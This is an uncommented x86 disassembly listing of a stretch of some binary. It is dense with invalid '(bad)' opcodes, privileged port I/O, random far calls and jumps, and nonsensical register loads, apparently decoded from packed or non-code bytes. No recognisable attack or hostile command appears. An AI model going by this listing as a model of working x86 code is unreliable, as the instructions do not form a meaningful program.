  422da5:	test   BYTE PTR [edi+edx*2-0x15],ah
  422da9:	jae    0x422d98
  422dab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422dac:	ret    0xad21
  422daf:	push   eax
  422db0:	pushf  
  422db1:	jo     0x422d70
  422db3:	test   DWORD PTR [edx-0x35de962],esi
  422db9:	add    DWORD PTR [ecx-0x47],ebp
  422dbc:	mov    edi,0x293ee704
  422dc1:	fistp  DWORD PTR [edx+0x3]
  422dc4:	push   ecx
  422dc5:	mov    esp,0xebb2f3dc
  422dca:	in     al,dx
  422dcb:	aam    0x8e
  422dcd:	enter  0xa3b6,0x61
  422dd1:	ja     0x422d55
  422dd3:	fcomp  DWORD PTR [eax+0x40f4c00b]
  422dd9:	pusha  
  422dda:	dec    edx
  422ddb:	or     bl,al
  422ddd:	fcomp  QWORD PTR [edx-0x5edcdbdd]
  422de3:	and    cl,BYTE PTR [ebx]
  422de5:	jl     0x422db4
  422de7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422de8:	ficom  DWORD PTR [ebx]
  422dea:	cwde   
  422deb:	mov    ?,WORD PTR [edx+esi*1]
  422dee:	frndint 
  422df0:	mov    dl,0xf
  422df2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422df3:	jge    0x422df6
  422df5:	rcl    BYTE PTR [edi-0x71],cl
  422df8:	xor    ecx,DWORD PTR [ebx]
  422dfa:	push   ecx
  422dfb:	pop    ebp
  422dfc:	adc    DWORD PTR [edi],0xb
  422dff:	inc    ebx
  422e00:	lock inc ebx
  422e02:	loope  0x422e57
  422e04:	mov    esp,0xb86433b1
  422e09:	jmp    0x422ddc
  422e0b:	ins    BYTE PTR es:[edi],dx
  422e0c:	or     bh,BYTE PTR [ebp+0x50]
  422e0f:	push   ebp
  422e10:	mov    ah,0x5
  422e12:	rcr    bl,1
  422e14:	imul   eax,esp,0xd64e3f98
  422e1a:	stc    
  422e1b:	jno    0x422e97
  422e1d:	dec    edx
  422e1e:	icebp  
  422e1f:	sbb    al,0xb2
  422e21:	pop    edi
  422e22:	sub    ch,cl
  422e24:	(bad)  
  422e25:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422e27:	push   es
  422e28:	cmp    BYTE PTR [edi],cl
  422e2a:	ficom  DWORD PTR [edx]
  422e2c:	stos   BYTE PTR es:[edi],al
  422e2d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422e2e:	add    ah,BYTE PTR [edi+0x18]
  422e31:	pop    es
  422e32:	xchg   esp,eax
  422e33:	cwde   
  422e34:	xchg   esi,eax
  422e35:	test   al,0x59
  422e37:	dec    esp
  422e38:	mov    ah,0xb4
  422e3a:	sub    cl,bl
  422e3c:	push   eax
  422e3d:	call   0xbe4e788
  422e42:	(bad)  
  422e43:	out    dx,eax
  422e44:	std    
  422e45:	xor    ebx,DWORD PTR [eax+0x38]
  422e48:	cld    
  422e49:	ficomp WORD PTR [edx+0x124e850d]
  422e4f:	sar    al,0x23
  422e52:	fsub   DWORD PTR [edi+0x19c9957e]
  422e58:	push   0xb17f6a18
  422e5d:	fisubr DWORD PTR [edi+0x0]
  422e60:	or     bl,BYTE PTR ds:0x9f14170d
  422e66:	inc    ebx
  422e67:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422e68:	mov    eax,0xeeeccd4c
  422e6d:	pop    ss
  422e6e:	loopne 0x422ea5
  422e70:	retf   0x9b91
  422e73:	add    eax,0xd6ca424
  422e78:	js     0x422e2f
  422e7a:	mov    edx,0xa20b6bc5
  422e7f:	jp     0x422e48
  422e81:	pop    esp
  422e82:	out    dx,al
  422e83:	fdivr  QWORD PTR [esi-0x30326bdb]
  422e89:	stc    
  422e8a:	adc    al,0xa7
  422e8c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422e8d:	inc    esi
  422e8e:	imul   esi,esp,0x6f
  422e91:	js     0x422eff
  422e93:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422e94:	inc    edx
  422e95:	mov    bh,BYTE PTR [edi+esi*8+0x69]
  422e99:	sbb    al,0xa7
  422e9b:	aam    0xbc
  422e9d:	icebp  
  422e9e:	fmul   DWORD PTR [ebp-0x119b14cb]
  422ea4:	idiv   BYTE PTR [edx+0x2c8aa0bf]
  422eaa:	aam    0xc5
  422eac:	daa    
  422ead:	sbb    esi,ecx
  422eaf:	aam    0x5
  422eb1:	adc    eax,0x16bbc882
  422eb6:	cli    
  422eb7:	jmp    0x422e47
  422eb9:	or     ebx,DWORD PTR [ebp-0x67713557]
  422ebf:	push   0x8
  422ec1:	push   edx
  422ec2:	or     al,BYTE PTR [edi]
  422ec4:	mov    dl,0x74
  422ec6:	and    DWORD PTR [eax],ebp
  422ec8:	inc    esi
  422ec9:	xlat   BYTE PTR ds:[ebx]
  422eca:	jb     0x422e84
  422ecc:	sti    
  422ecd:	or     ebp,DWORD PTR [ecx+0x112db00b]
  422ed3:	mov    ah,0xe5
  422ed5:	shl    ebp,cl
  422ed7:	mov    ch,0xb2
  422ed9:	(bad)  
  422eda:	imul   esi,edi,0x3a77c349
  422ee0:	mov    bl,0x32
  422ee2:	repz inc esi
  422ee4:	mov    dl,0x33
  422ee6:	jmp    0x4e4a868d
  422eeb:	std    
  422eec:	scas   eax,DWORD PTR es:[edi]
  422eed:	fldcw  WORD PTR [ebp+0x61]
  422ef0:	bnd jmp 0xa9dd26ff
  422ef6:	add    al,0xa7
  422ef8:	xchg   ch,dh
  422efa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422efb:	mov    ebx,DWORD PTR [edi-0x5e]
  422efe:	inc    esp
  422eff:	or     BYTE PTR [eax+0x79],al
  422f02:	call   0xe680:0xec480296
  422f09:	mov    WORD PTR [edi],ds
  422f0b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422f0c:	mov    esi,0xb0035dac
  422f11:	cdq    
  422f12:	in     eax,0xe5
  422f14:	mov    WORD PTR [eax],fs
  422f16:	ins    DWORD PTR es:[edi],dx
  422f17:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422f18:	scas   al,BYTE PTR es:[edi]
  422f19:	popf   
  422f1a:	mov    ah,0x2c
  422f1c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422f1d:	lods   eax,DWORD PTR ds:[esi]
  422f1e:	inc    edx
  422f1f:	pop    ebp
  422f20:	pop    esi
  422f21:	or     ebx,edi
  422f23:	pop    eax
  422f24:	hlt    
  422f25:	mov    ebx,0x2eaf324e
  422f2a:	rol    BYTE PTR [edx],cl
  422f2c:	pushf  
  422f2d:	or     esp,esp
  422f2f:	(bad)  
  422f30:	mov    ecx,0x2fc1f165
  422f35:	or     eax,DWORD PTR [ebp-0x634b64af]
  422f3b:	push   ds
  422f3c:	jecxz  0x422f2a
  422f3e:	call   0x7886:0xcff60908
  422f45:	arpl   WORD PTR [esi*4-0x4d7a1da0],dx
  422f4c:	les    edx,FWORD PTR [edi-0x66]
  422f4f:	mov    esp,0x2f837084
  422f54:	and    bl,bl
  422f56:	pusha  
  422f57:	add    cl,0x9c
  422f5a:	call   0x1a0b:0x31f8c22c
  422f61:	push   esp
  422f62:	jmp    0x1d5f6504
  422f67:	ins    BYTE PTR es:[edi],dx
  422f68:	jb     0x422fc9
  422f6a:	lods   al,BYTE PTR ds:[esi]
  422f6b:	test   ch,bl
  422f6d:	stos   DWORD PTR es:[edi],eax
  422f6e:	adc    al,al
  422f70:	pop    ebp
  422f71:	jmp    0x281a:0x78371d9a
  422f78:	jmp    0x11f5:0xfba7b76f
  422f7f:	mov    edx,0x1b499e7b
  422f84:	mov    ?,WORD PTR [eax-0x6f4958c2]
  422f8a:	sbb    DWORD PTR [eax],eax
  422f8c:	and    DWORD PTR [ebx-0x3f3d5fc0],esi
  422f92:	sub    eax,0x72db6ccf
  422f97:	aas    
  422f98:	mov    bl,0x2a
  422f9a:	xchg   BYTE PTR [edi+0x1d],dh
  422f9d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422f9e:	sbb    BYTE PTR [ecx],bl
  422fa0:	js     0x422fe7
  422fa2:	mul    DWORD PTR [edi-0x5a]
  422fa5:	cs pop ds
  422fa7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422fa8:	(bad)  
  422fa9:	push   ebp
  422faa:	push   cs
  422fab:	push   ecx
  422fac:	cwde   
  422fad:	sub    BYTE PTR [esi],ah
  422faf:	(bad)  
  422fb0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422fb1:	je     0x422f4f
  422fb3:	mov    BYTE PTR [eax+0xb],ah
  422fb6:	dec    ecx
  422fb7:	lar    esp,ax
  422fba:	sub    DWORD PTR [ecx],ebp
  422fbc:	icebp  
  422fbd:	xor    ecx,DWORD PTR [esi]
  422fbf:	pop    ecx
  422fc0:	inc    ecx
  422fc1:	or     ch,BYTE PTR [ebp-0x58776cbe]
  422fc7:	xor    eax,0xbc09cb03
  422fcc:	mov    dl,0x72
  422fce:	dec    eax
  422fcf:	popa   
  422fd0:	out    dx,al
  422fd1:	cmp    BYTE PTR [edi+eax*4+0x5],ah
  422fd5:	or     ebx,edi
  422fd7:	push   ecx
  422fd8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422fd9:	xlat   BYTE PTR ds:[ebx]
  422fda:	mov    ds:0x9a563627,eax
  422fdf:	mov    dh,0x83
  422fe1:	sbb    al,0x56
  422fe3:	add    al,0xe5
  422fe5:	daa    
  422fe6:	cli    
  422fe7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422fe8:	xor    al,0x16
  422fea:	(bad)  
  422feb:	out    0xd,al
  422fed:	add    ch,ch
  422fef:	or     DWORD PTR [edx+0x655375bc],esi
  422ff5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422ff6:	jmp    0x423059
  422ff8:	mov    ah,0xb
  422ffa:	add    edi,DWORD PTR [ecx]
  422ffc:	mov    bl,0xb7
  422ffe:	mov    dl,0xa9
  423000:	test   ebp,esp
  423002:	call   0x4ae2:0x469d3198
  423009:	test   BYTE PTR [eax+0xbd52fa7],bl
  42300f:	mov    cl,BYTE PTR [edx]
  423011:	scas   al,BYTE PTR es:[edi]
  423012:	or     edi,edx
  423014:	cli    
  423015:	loope  0x42303d
  423017:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423018:	mov    eax,0x4e66873b
  42301d:	out    0x64,eax
  42301f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423020:	aas    
  423021:	jb     0x42304b
  423023:	in     eax,dx
  423024:	dec    ebx
  423025:	leave  
  423026:	add    bh,ah
  423028:	adc    BYTE PTR [edx-0x4d880c44],dl
  42302e:	call   0x7f48:0x6f245eba
  423035:	and    ebx,DWORD PTR [esi+0x3f0b611d]
  42303b:	aaa    
  42303c:	jmp    0x42302a
  42303e:	jae    0x423074
  423040:	mov    edx,DWORD PTR [edx]
  423042:	jmp    0xdde6:0x8b7db11f
  423049:	pop    edx
  42304a:	mov    al,ds:0x49c3822f
  42304f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423050:	sub    edx,DWORD PTR [eax+0x45]
  423053:	jecxz  0x42309d
  423055:	(bad)  
  423056:	adc    DWORD PTR [edx-0x73616b4e],esi
  42305c:	adc    eax,0x65dd070e
  423061:	sbb    BYTE PTR [esi+0x5],bl
  423064:	aad    0xa
  423066:	test   DWORD PTR [edx+0x9],0x16aedf4
  42306d:	repz iret 
  42306f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423070:	inc    edx
  423071:	jle    0x42300d
  423073:	push   ecx
  423074:	mov    ss,WORD PTR [eax+edi*4-0x5bda5540]
  42307b:	fwait
  42307c:	popf   
  42307d:	jge    0x423093
  42307f:	mov    ebx,?
  423081:	push   esi
  423082:	push   ebp
  423083:	lods   al,BYTE PTR ds:[esi]
  423084:	jb     0x4230b2
  423086:	push   ds
  423087:	mov    esp,0x7f7b8328
  42308c:	mov    bl,0xcc
  42308e:	add    eax,0x3dc58aa7
  423093:	sahf   
  423094:	push   cs
  423095:	or     esp,DWORD PTR [ebp+edx*2-0x49]
  423099:	(bad)  
  42309a:	js     0x4230ac
  42309c:	inc    edx
  42309d:	pop    ebx
  42309e:	fwait
  42309f:	scas   eax,DWORD PTR es:[edi]
  4230a0:	cwde   
  4230a1:	ja     0x423073
  4230a3:	xchg   ecx,eax
  4230a4:	in     eax,0xb3
  4230a6:	dec    edx
  4230a7:	pop    edi
  4230a8:	mov    gs,edi
  4230aa:	std    
  4230ab:	mov    al,ds:0xd8abdd7f
  4230b0:	pop    eax
  4230b1:	nop
  4230b2:	sbb    bl,BYTE PTR [edi]
  4230b4:	dec    ebp
  4230b5:	sbb    eax,0x718f9f9e
  4230ba:	jnp    0x423063
  4230bc:	loopne 0x42307c
  4230be:	and    edi,0xffffffac
  4230c1:	ja     0x42312d
  4230c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4230c4:	jne    0x42308a
  4230c6:	add    dh,BYTE PTR [ebx+0x1be376ae]
  4230cc:	int3   
  4230cd:	shl    eax,1
  4230cf:	call   0x5dd21fe
  4230d4:	mov    dh,0x52
  4230d6:	scas   al,BYTE PTR es:[edi]
  4230d7:	xor    al,dh
  4230d9:	retf   0x5543
  4230dc:	repz jge 0x4230bb
  4230df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4230e0:	loope  0x4230d5
  4230e2:	xor    ecx,ebx
  4230e4:	rcr    DWORD PTR [esi+0x7],1
  4230e7:	mov    ds:0x8eb723ae,eax
  4230ec:	jb     0x4230b2
  4230ee:	stos   BYTE PTR es:[edi],al
  4230ef:	push   ds
  4230f0:	dec    edi
  4230f1:	mov    ebx,0xb6cd17a
  4230f6:	pop    edi
  4230f7:	into   
  4230f8:	or     ah,BYTE PTR [edi+0x783f2cfb]
  4230fe:	call   0xa04c:0xc016c6a3
  423105:	test   BYTE PTR [ebx],0xb8
  423108:	mov    ebp,0x58e7f4d8
  42310d:	xor    al,0x9d
  42310f:	outs   dx,BYTE PTR ds:[esi]
  423110:	mul    bl
  423112:	xchg   al,cl
  423114:	jae    0x4230c8
  423116:	jl     0x42317f
  423118:	mov    esp,0xed87f279
  42311d:	push   0xb850ef0
  423122:	dec    eax
  423123:	dec    ebx
  423124:	xor    BYTE PTR [eax+eax*8-0x65dbdefb],cl
  42312b:	jl     0x42312f
  42312d:	xchg   ebp,eax
  42312e:	cmc    
  42312f:	adc    esi,ebx
  423131:	call   0x7d5dcf9a
  423136:	call   0xe0a4:0xaae56de2
  42313d:	outs   dx,BYTE PTR ds:[esi]
  42313e:	call   0x7d26:0x802c3cb0
  423145:	cdq    
  423146:	xchg   esp,eax
  423147:	mov    al,ds:0xef174c51
  42314c:	repz mov esp,DWORD PTR [ebx]
  42314f:	pop    edi
  423150:	sub    al,0x9e
  423152:	popf   
  423153:	ss dec edi
  423155:	adc    bh,al
  423157:	mov    dh,0xc2
  423159:	add    al,0x51
  42315b:	dec    esi
  42315c:	pop    es
  42315d:	or     ebx,DWORD PTR [esi]
  42315f:	(bad)  
  423160:	js     0x4231de
  423162:	cmp    DWORD PTR [edx+0x3c],eax
  423165:	inc    esp
  423166:	call   0xcc05:0xd151ba4a
  42316d:	or     BYTE PTR [edi+0x5b0ba9da],0x99
  423174:	retf   
  423175:	xchg   edi,esi
  423177:	push   ebx
  423178:	sub    ebx,DWORD PTR [ebp-0x66]
  42317b:	std    
  42317c:	lds    esp,FWORD PTR [ebx]
  42317e:	fs or  al,0x12
  423181:	pop    ds
  423182:	jmp    0x11bc:0x736af0a8
  423189:	in     eax,dx
  42318a:	inc    ecx
  42318b:	push   ecx
  42318c:	inc    edx
  42318d:	pop    edi
  42318e:	or     ebp,DWORD PTR [ebp-0x3ef8084e]
  423194:	fcmovnu st,st(2)
  423196:	push   ss
  423197:	dec    esp
  423198:	pop    edi
  423199:	ss ss loop 0x4231a6
  42319d:	(bad)  
  42319e:	sbb    DWORD PTR [edi+0x6e927e38],edx
  4231a4:	and    al,0x57
  4231a6:	add    dl,BYTE PTR [eax]
  4231a8:	dec    edx
  4231a9:	adc    BYTE PTR [edx-0x14086415],bl
  4231af:	pop    ss
  4231b0:	inc    ecx
  4231b1:	(bad)  
  4231b2:	push   esp
  4231b3:	fidiv  WORD PTR [ebx+0xb]
  4231b6:	or     edi,DWORD PTR [edi-0x22a752ac]
  4231bc:	rcr    ah,1
  4231be:	popf   
  4231bf:	dec    edx
  4231c0:	mov    al,ds:0x331267e1
  4231c5:	inc    esi
  4231c6:	jecxz  0x4231db
  4231c8:	pop    edx
  4231c9:	jg     0x4231db
  4231cb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4231cc:	and    DWORD PTR [esi+0xd],esi
  4231cf:	mov    ebp,0x7e643e9
  4231d4:	mov    bh,0xcb
  4231d6:	jnp    0x42320b
  4231d8:	popa   
  4231d9:	add    DWORD PTR [edx],ebx
  4231db:	mov    al,ds:0xa7df3970
  4231e0:	mov    ah,0xfc
  4231e2:	and    al,0x7e
  4231e4:	fucomip st,st(3)
  4231e6:	loop   0x423267
  4231e8:	mov    dl,0x2d
  4231ea:	retf   0x491c
  4231ed:	jns    0x4231a5
  4231ef:	test   DWORD PTR [eax+0xb],ecx
  4231f2:	cmp    dl,BYTE PTR [ebp+0x3e]
  4231f5:	pop    esp
  4231f6:	cld    
  4231f7:	test   bl,dl
  4231f9:	mov    bh,0x86
  4231fb:	int3   
  4231fc:	les    ecx,FWORD PTR [edx-0x26]
  4231ff:	xor    esp,esi
  423201:	lahf   
  423202:	add    DWORD PTR [edx],ebx
  423204:	inc    edi
  423205:	or     esi,DWORD PTR [esi+ecx*2-0x12]
  423209:	loope  0x423267
  42320b:	mov    al,0x45
  42320d:	dec    eax
  42320e:	call   0x43cc:0x8bf97c29
  423215:	pop    esi
  423216:	push   edx
  423217:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423218:	enter  0x780f,0x2
  42321c:	xchg   ebp,eax
  42321d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42321e:	sar    DWORD PTR [ecx],1
  423220:	mov    bl,0x45
  423222:	enter  0x6b79,0x9f
  423226:	rcr    DWORD PTR [ebx+0x5f16c97e],cl
  42322c:	jg     0x423239
  42322e:	daa    
  42322f:	push   cs
  423230:	push   ds
  423231:	lock mov gs,WORD PTR [eax-0x1f654e57]
  423238:	push   edx
  423239:	inc    ebx
  42323a:	jge    0x423250
  42323c:	ds in  eax,0x9
  42323f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423240:	shl    DWORD PTR [ecx],cl
  423242:	scas   eax,DWORD PTR es:[edi]
  423243:	call   0xc82a3fe3
  423248:	lods   al,BYTE PTR ds:[esi]
  423249:	push   ecx
  42324a:	xchg   ecx,eax
  42324b:	hlt    
  42324c:	jb     0x423279
  42324e:	int    0x84
  423250:	adc    DWORD PTR [edi],ebx
  423252:	push   0xffffffa7
  423254:	stos   BYTE PTR es:[edi],al
  423255:	inc    esp
  423256:	inc    esp
  423258:	(bad)  
  423259:	and    ah,dl
  42325b:	pop    eax
  42325c:	mov    dl,0x8a
  42325e:	mov    ebp,0xcc9b1ddb
  423263:	pop    ecx
  423264:	outs   dx,BYTE PTR ds:[esi]
  423265:	or     ebp,DWORD PTR [ebp+0x18023843]
  42326b:	into   
  42326c:	mov    ah,0x16
  42326e:	lahf   
  42326f:	(bad)  
  423270:	jmp    0x82b6:0xb2c00f17
  423277:	hlt    
  423278:	push   0x3c
  42327a:	aas    
  42327b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42327c:	imul   bl
  42327e:	dec    ebp
  42327f:	test   BYTE PTR [edx+0x5b287768],dl
  423285:	repz cmp bh,BYTE PTR [edx+0x466bdfaf]
  42328c:	mov    eax,DWORD PTR ds:0x1c012042
  423292:	and    DWORD PTR [ebx-0x3396b4e8],edi
  423298:	popa   
  423299:	int    0x1e
  42329b:	jl     0x42324f
  42329d:	pushf  
  42329e:	and    DWORD PTR [ecx-0x3],ecx
  4232a1:	stos   DWORD PTR es:[edi],eax
  4232a2:	cmp    edi,DWORD PTR [ecx-0x46]
  4232a5:	or     ebp,esi
  4232a7:	and    bl,bl
  4232a9:	shl    bl,0xff
  4232ac:	mov    ebp,0xb2cf7ca2
  4232b1:	mov    edx,0xafd249ba
  4232b6:	sbb    bh,BYTE PTR ds:0x757a0b5e
  4232bc:	ds (bad) 
  4232be:	popf   
  4232bf:	inc    edx
  4232c0:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  4232c2:	call   0x2dee:0x70648784
  4232c9:	in     eax,0x7e
  4232cb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4232cc:	add    esi,DWORD PTR ds:0xa9b76186
  4232d2:	cmp    al,BYTE PTR [edx]
  4232d4:	mov    dl,0xe7
  4232d6:	in     al,0xae
  4232d8:	xchg   esi,eax
  4232d9:	mov    ch,BYTE PTR [edi]
  4232db:	sub    eax,0x2fc60bab
  4232e0:	jno    0x4232df
  4232e2:	data16 jl 0x423338
  4232e5:	jnp    0x4232d4
  4232e7:	test   al,0xb2
  4232e9:	je     0x423347
  4232eb:	hlt    
  4232ec:	shl    ebp,1
  4232ee:	scas   eax,DWORD PTR es:[edi]
  4232ef:	outs   dx,DWORD PTR ds:[esi]
  4232f0:	or     al,BYTE PTR cs:[edi-0x54f39aae]
  4232f7:	fist   DWORD PTR [ecx]
  4232f9:	and    DWORD PTR [edx+0x65],edi
  4232fc:	(bad)  [ebx]
  4232fe:	xchg   ebp,eax
  4232ff:	xchg   ebx,eax
  423300:	inc    esp
  423301:	shr    BYTE PTR [ecx],1
  423303:	push   cs
  423304:	sti    
  423305:	xchg   ebx,eax
  423306:	xchg   DWORD PTR [edi+ebp*8],esp
  423309:	dec    esp
  42330a:	call   0x82de:0x84d582b
  423311:	or     ebx,DWORD PTR [esi+0x3b]
  423314:	mov    esi,0x5b8d9fba
  423319:	cmp    dh,ah
  42331b:	fidiv  DWORD PTR [edx+0x4bf3bef8]
  423321:	push   0xb110860
  423326:	inc    esp
  423327:	xor    DWORD PTR [ecx-0x2c70f8c2],edi
  42332d:	sbb    eax,DWORD PTR [esi-0x259b2142]
  423333:	out    dx,eax
  423334:	call   FWORD PTR [ebx+0x76139d9]
  42333a:	loop   0x4232dd
  42333c:	fild   WORD PTR [esi]
  42333e:	sbb    al,0x93
  423340:	mov    dl,0xcd
  423342:	mov    ah,0x22
  423344:	call   0xcb0b:0x675e358f
  42334b:	pop    ss
  42334c:	loopne 0x423331
  42334e:	mov    esi,0xd678914b
  423353:	dec    ecx
  423354:	(bad)  
  423355:	or     BYTE PTR [edi],dh
  423357:	mov    ecx,0x47c9aba8
  42335c:	xchg   edx,eax
  42335d:	mov    ebx,DWORD PTR [eax-0x59]
  423360:	mov    bh,0x47
  423362:	jmp    0x423305
  423364:	aaa    
  423365:	pop    esi
  423366:	stos   BYTE PTR es:[edi],al
  423367:	test   eax,0x39a293b2
  42336c:	(bad)  
  42336e:	ret    
  42336f:	pop    esp
  423370:	push   0x18
  423372:	in     al,dx
  423373:	fisttp DWORD PTR [esi-0x4576654f]
  423379:	push   0xbecd6f2
  42337e:	mov    ebx,0x4130c505
  423383:	aaa    
  423384:	pop    ss
  423385:	or     DWORD PTR [edx-0x77c2101e],ebx
  42338b:	sar    BYTE PTR [ebx],0x92
  42338e:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423390:	jbe    0x42340c
  423392:	mov    edi,0x400d3e23
  423397:	fnsave [ebx+0x6b4e26bc]
  42339d:	js     0x4233fc
  42339f:	sbb    BYTE PTR [edx-0x55],ch
  4233a2:	pop    esi
  4233a3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4233a4:	or     ch,ch
  4233a6:	fst    DWORD PTR [eax-0x4e00d481]
  4233ac:	or     eax,0xdba4767b
  4233b1:	sub    DWORD PTR [esi+eiz*2-0x15],ebx
  4233b5:	xor    esp,DWORD PTR [edx+0x5c]
  4233b8:	hlt    
  4233b9:	popa   
  4233ba:	call   0x8973:0x41f4e64b
  4233c1:	push   ds
  4233c2:	jo     0x42336b
  4233c4:	jnp    0x423371
  4233c6:	mov    edi,0x92d89163
  4233cb:	add    al,0xb2
  4233cd:	xor    cl,dl
  4233cf:	and    dh,BYTE PTR [esi+esi*1-0x4d]
  4233d3:	fs cmc 
  4233d5:	or     BYTE PTR [ecx],ah
  4233d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4233d8:	(bad)  
  4233d9:	adc    bl,cl
  4233db:	int3   
  4233dc:	mov    cl,0x23
  4233de:	inc    esp
  4233df:	bound  edx,QWORD PTR [edi]
  4233e1:	leave  
  4233e2:	out    dx,al
  4233e3:	aaa    
  4233e4:	arpl   WORD PTR [edx-0xc],ax
  4233e7:	dec    ebx
  4233e8:	and    BYTE PTR [ebx],cl
  4233ea:	jl     0x4233b3
  4233ec:	dec    esp
  4233ed:	cmp    al,0xa2
  4233ef:	sub    eax,0x4c9a59e8
  4233f4:	xchg   edi,eax
  4233f5:	mov    bh,BYTE PTR [eax+ebp*2+0x478cfdc6]
  4233fc:	mov    ebp,?
  4233fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4233ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423400:	std    
  423401:	call   0x2392786
  423406:	(bad)  
  423407:	in     eax,dx
  423408:	mov    dl,0x29
  42340a:	js     0x42343d
  42340c:	call   0x5de15b99
  423411:	or     edx,DWORD PTR [ebx]
  423413:	or     ecx,ebp
  423415:	nop
  423416:	loop   0x4233f4
  423418:	fsubr  st,st(2)
  42341a:	call   0x150:0xbb001c6c
  423421:	or     esi,edx
  423423:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423424:	xchg   edx,eax
  423425:	stos   BYTE PTR es:[edi],al
  423426:	add    BYTE PTR [esi+ecx*4-0x5c],bh
  42342a:	div    bl
  42342c:	mov    dl,0xa2
  42342e:	jl     0x423408
  423430:	mov    bh,0xf4
  423432:	cdq    
  423433:	and    bl,BYTE PTR [edi]
  423435:	or     cl,BYTE PTR [esi]
  423437:	cmc    
  423438:	mov    edx,0x2963aeb4
  42343d:	dec    edx
  42343e:	inc    eax
  42343f:	lods   al,BYTE PTR ds:[esi]
  423440:	adc    bl,bh
  423442:	ja     0x4234a5
  423444:	in     al,dx
  423445:	mov    cl,0x32
  423447:	inc    ecx
  423448:	mov    dl,0xa5
  42344a:	inc    edx
  42344b:	push   es
  42344c:	ss test cl,dl
  42344f:	and    al,0x5a
  423451:	dec    ebp
  423452:	popf   
  423453:	inc    esp
  423454:	out    0xfa,al
  423456:	mov    esi,0x787742fc
  42345b:	push   0xfffffff7
  42345d:	or     esi,DWORD PTR [ebp+0x55d43a37]
  423463:	loope  0x4234e1
  423465:	mov    esp,0x7f12279a
  42346a:	xchg   BYTE PTR [edx-0x5806280a],bl
  423470:	xchg   BYTE PTR [edi+eax*8-0x72],bh
  423474:	sbb    eax,0xbc95d0f7
  423479:	push   cs
  42347a:	popf   
  42347b:	cmp    cl,BYTE PTR [edi+0x4b]
  42347e:	push   ebp
  42347f:	dec    edx
  423480:	data16 shl BYTE PTR [ebx-0x52],1
  423484:	ins    BYTE PTR es:[edi],dx
  423485:	adc    ebp,DWORD PTR [edi+0x71]
  423488:	xor    dl,BYTE PTR [ebx-0x7fa8abe8]
  42348e:	call   0xc410:0x1ed86055
  423495:	inc    esi
  423496:	aad    0xb0
  423498:	out    dx,al
  423499:	inc    ebx
  42349a:	push   ecx
  42349b:	mov    ebx,0x992430c2
  4234a0:	(bad)  
  4234a1:	outs   dx,DWORD PTR ds:[esi]
  4234a2:	call   0x421a:0xe78de7a0
  4234a9:	das    
  4234aa:	call   0xf617:0xad978ad7
  4234b1:	or     BYTE PTR [edi-0x32c90f59],ch
  4234b7:	pop    eax
  4234b8:	clc    
  4234b9:	xlat   BYTE PTR ds:[ebx]
  4234ba:	adc    al,0x6b
  4234bc:	lds    esi,FWORD PTR [ebp-0x63]
  4234bf:	aad    0x25
  4234c1:	adc    BYTE PTR [edi],ch
  4234c3:	cs inc edx
  4234c5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4234c6:	pusha  
  4234c7:	sub    eax,0xf8673696
  4234cc:	xor    ah,BYTE PTR [edx+0x1e]
  4234cf:	inc    eax
  4234d0:	and    DWORD PTR [ebx-0x5b],edx
  4234d3:	bound  esi,QWORD PTR [edx+0x544c887d]
  4234d9:	and    eax,0x7c23abc
  4234de:	adc    al,dl
  4234e0:	sub    edx,DWORD PTR [ebp+0x6c]
  4234e3:	adc    DWORD PTR [ecx+0x4996eb07],esi
  4234e9:	repnz inc esi
  4234eb:	pop    es
  4234ec:	and    al,0x45
  4234ee:	mov    esp,0x76b98ea0
  4234f3:	mov    esi,0xa3cc6b99
  4234f8:	mov    eax,ds:0xb16d749e
  4234fd:	xchg   edx,eax
  4234fe:	(bad)  
  4234ff:	ins    BYTE PTR es:[edi],dx
  423500:	cmp    al,0xf4
  423502:	fistp  DWORD PTR [edi]
  423504:	imul   esi,DWORD PTR [edx+0x3184a7e0],0x9bf217b1
  42350e:	stos   DWORD PTR es:[edi],eax
  42350f:	std    
  423510:	inc    edx
  423511:	retf   0x719a
  423514:	cmp    dh,BYTE PTR [edi]
  423516:	xor    al,0x9a
  423518:	push   0x5e
  42351a:	xor    DWORD PTR [edi-0x5a],ebx
